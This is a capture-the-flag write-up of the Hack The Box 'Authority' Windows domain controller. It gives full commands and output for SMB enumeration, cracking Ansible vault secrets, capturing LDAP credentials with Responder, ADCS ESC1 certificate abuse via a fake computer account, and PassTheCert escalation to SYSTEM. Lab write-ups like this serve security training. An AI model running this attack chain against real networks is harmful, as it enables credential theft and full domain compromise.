---
title: Hack The Box - Authority
date: 2025-07-3
categories: [hackthebox]
tags: [windows,Active Directory,ESC1,smbmap,smbclient,PassTheCert,Ansible,Medium]
comments: true
toc: true
---

<img src="/assets/Hackthebox/Authority/Authority.png"  width="90%" height="70%">

Authority is a Windows Domain Controller.
We accessed open SMB shares and found some Ansible playbooks.
From there, we cracked some encrypted fields to extract credentials for a PWM instance.The PWM instance was running in configuration mode, which allowed us to make it authenticate to our machine over LDAP, exposing plaintext credentials.Using those credentials, we enumerated Active Directory Certificate Services (AD CS) and found it vulnerable to ESC1. Instead of any domain user being allowed to enroll, any domain computer had that permission.
So, we added a fake computer to the domain and used it to request a certificate on behalf of the Domain Controller.Although the certificate couldn’t be used for direct logon, we used pass-the-cert attack to dump NTLM hashes and got Administrator access.

## Recon
### Nmap
Starting with `nmap`. `nmap` finds a lot of open ports. 
```bash
$nmap 10.10.11.222 -oN authority-allports.nmap

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 09:34 CDT
Nmap scan report for 10.10.11.222
Host is up (0.050s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
8443/tcp open  https-alt

Nmap done: 1 IP address (1 host up) scanned in 617.75 seconds

```

```
$nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,8443 -oN authority-service.nmap 10.10.11.222
Nmap scan report for 10.10.11.222
Host is up (0.088s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-03 18:56:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-07-03T18:57:36+00:00; +4h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-07-03T18:57:36+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-07-03T18:57:36+00:00; +4h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-07-03T18:57:36+00:00; +4h00m01s from scanner time.
8443/tcp open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 03 Jul 2025 18:56:54 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 03 Jul 2025 18:56:53 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Thu, 03 Jul 2025 18:56:53 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Thu, 03 Jul 2025 18:57:00 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2025-07-01T18:05:50
|_Not valid after:  2027-07-04T05:44:14
|_http-title: Site doesnt have a title (text/html;charset=ISO-8859-1).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=7/3%Time=68669A34%P=x86_64-pc-linux-
SF:gnu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html
SF:;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Thu,\x2003\x20
SF:Jul\x202025\x2018:56:53\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\
SF:n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\
SF:"/></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x2
SF:0GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20
SF:Thu,\x2003\x20Jul\x202025\x2018:56:53\x20GMT\r\nConnection:\x20close\r\
SF:n\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x
SF:20text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Thu
SF:,\x2003\x20Jul\x202025\x2018:56:54\x20GMT\r\nConnection:\x20close\r\n\r
SF:\n\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;
SF:URL='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\
SF:r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\
SF:r\nContent-Length:\x201936\r\nDate:\x20Thu,\x2003\x20Jul\x202025\x2018:
SF:57:00\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20
SF:lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x
SF:20Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahom
SF:a,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgrou
SF:nd-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;
SF:}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:b
SF:lack;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}<
SF:/style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2
SF:0Request</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20
SF:Report</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20t
SF:he\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p
SF:><b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20
SF:process\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20pe
SF:rceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x
SF:20request\x20syntax,\x20invalid\x20);
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 3h59m59s
| smb2-time: 
|   date: 2025-07-03T18:57:30
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

### /etc/hosts

Adding `authority.htb` to our hosts file.

```10.10.11.222 authority.htb```

### Port - 80

Port 80 returns a default IIS webpage.

![alt text](/assets/Hackthebox/Authority/image-1.png)

The 404 page also looks like the default IIS error page.

![alt text](/assets/Hackthebox/Authority/image-2.png)

### Port 8843

Port 8843 redirects to /pwm/.

![alt text](/assets/Hackthebox/Authority/image.png)

When we click on the arrow we can see more information and the version number of PWM.

![alt text](/assets/Hackthebox/Authority/image-3.png)

Clicking on any of the tab Configuration Manager and Configuration Editor, it prompts us for password.

![alt text](/assets/Hackthebox/Authority/image-4.png)

### SMB Enumeration

Using smbmap we can see that we have access to the Development share.
```smbmap -H 10.10.11.222 -u 'anonymous' -p ''
[+] Guest session   	IP: 10.10.11.222:445	Name: authority.htb                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	NO ACCESS	
	Development                                       	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share 
```

### Smbclient
Now, we will use smbclinet will null authentication to view and download all the files locally.
```
$smbclient -N //10.10.11.222/Development 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 17 08:20:38 2023
  ..                                  D        0  Fri Mar 17 08:20:38 2023
  Automation                          D        0  Fri Mar 17 08:20:40 2023

smb: \> RECURSE ON
smb: \> prompt no
smb: \> mget *
getting file \Automation\Ansible\ADCS\.ansible-lint of size 259 as Automation/Ansible/ADCS/.ansible-lint (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
<SNIP>
```


## Shell as svc_ldap
### Asnsible Files

We have downloaded a folder called Automation which contains Anisble files.

![alt text](/assets/Hackthebox/Authority/image-5.png)

Under Ansible > PWM > defaults > main.yml we can see some credentials.
```yml
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

### Credentials Recovery
The values in the file are protected by Ansible vault. We can use ansible2john which takes a file with two lines one header and other the hex-encoded value. First we need to format the protected values in the files.

```
$cat ldap_admin_password 
$ANSIBLE_VAULT;1.1;AES256
633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764

$cat pwm_admin_login 
$ANSIBLE_VAULT;1.1;AES256
326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438

$cat pwm_admin_password 
$ANSIBLE_VAULT;1.1;AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531

```

```
$ansible2john ldap_admin_password pwm_admin_login pwm_admin_password | tee ansible_hashes
ldap_admin_password:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
pwm_admin_login:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
pwm_admin_password:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
```

### Hashcat

Now, we can use hashcat to crack all the hashes.

```
$hashcat ansible_hashes /usr/share/wordlists/rockyou.txt --user

$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*

```

```
$cat ldap_admin_password | ansible-vault decrypt
Vault password: 
Decryption successful
DevT3st@123

$cat pwm_admin_login | ansible-vault decrypt
Vault password: 
Decryption successful
svc_pwm

$cat pwm_admin_password | ansible-vault decrypt
Vault password: 
Decryption successful
pWm_@dm!N_!23
```

### PWN Access

Since we have the credentials we can try to login to the website with it. The password `pWm_@dm!N_!23` works to login to the configuration manager.

### Configuration manager

![alt text](/assets/Hackthebox/Authority/image-6.png)

![alt text](/assets/Hackthebox/Authority/image-7.png)

### Configuration editor

We can also login to the Configuration Editor with the same credentials `pWm_@dm!N_!23`

In LDAP connection config we got the hostname `authority.authority.htb` and the username `svc_ldap`. The credentials are store but we cannot view it. 

![alt text](/assets/Hackthebox/Authority/image-81.png)

### Responder

We can now use reponder to grab the ldap credentials. We will open responder and start listning on the tun0 interface and port 389.

$sudo responder -I tun0

<SNIP>

![alt text](/assets/Hackthebox/Authority/image-9.png)

Once we configure LDAP url to our interface and click on test LDAP profile, we can get the LDAP credentials in clear text.

```
[LDAP] Cleartext Client   : 10.10.11.222
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

using netexec winrm we can test the credentials and we can see that we can get shell acess as svc_ldap.

```
$netexec winrm 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
WINRM       10.10.11.222    5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM       10.10.11.222    5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)

```
### Evil-winrm

We got shell as svs_ldap using evil-winrm.
```
$evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
*Evil-WinRM* PS C:\Users\svc_ldap>
```

## Shell as Administrator

### ADCS Exploitation

We will use `certipy` on our attacker machine to enumerate ADCS. We can use find command to identify templates and use -vunlerable option to only show the vulnerables ones.

```
certipy find -dc-ip 10.10.11.222  -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication

```
It identifies a template `CorpVPN` and this is vulnerable to `ESC1`.

According to this [post](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/). Templates vulnerable to `ESC1` must have the following configurations:
* Client Authentication: True
* Enabled: True
* Enrollee Supplies Subject: True
* Requires Management Approval: False
* Authorized Signatures Required: 0

This conditions matches the output that comes out of authority but will only one difference. In this, case `Domain Computers` can enroll with this templates, not `Domain Users`.

### Creating Computer Account
The settings that allows a user to add a computer to domain is the
ms-ds-machineaccountquota. We can use `netexec` to view the machinequota. 

```
$netexec ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.222    636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
MAQ         10.10.11.222    389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10

```
This means we can add upto 10 computers. We can add computers using `impacket-addcomputer`.

```
$impacket-addcomputer Authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name testerpc -computer-pass 'Password@123' -method LDAPS -dc-ip 10.10.11.222
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account testerpc$ with password Password@123.
```
With the computer account created earlier, certipy will create a certificate.

```
$certipy req -username testerpc$ -password Password@123 -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'
```


### PassTheCert

We can use certipy auth command to get the NTLM hash of the administrator but this failed.

```
certipy  auth -pfx administrator_authority.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@authority.htb'
    [1] DNS Host Name: 'authority.htb'
> 0
[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

This happens “when a domain controller doesn’t have a certificate installed for smart cards”. Specifically, it happens because “the DC isn’t properly set up for PKINIT and authentication will fail”.

Alternatively, we can use [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) attack.

To perform the PassTheCert attack. We will need key and cert in seprate files. We will use certipy to get these files.

```
$python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222

#help
add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
add_user new_user [parent] - Creates a new user.
add_user_to_group user group - Adds a user to a group.


# add_user_to_group svc_ldap administrators
Adding user: svc_ldap to group Administrators result: OK

```

svc-ldap has been added to the administrator group. We can use psexec to confim that we can login as administrator.
```
impacket-psexec authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'@10.10.11.222 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.222.....
[*] Found writable share ADMIN$
[*] Uploading file YZVCWrHm.exe
[*] Opening SVCManager on 10.10.11.222.....
[*] Creating service NYke on 10.10.11.222.....
[*] Starting service NYke.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```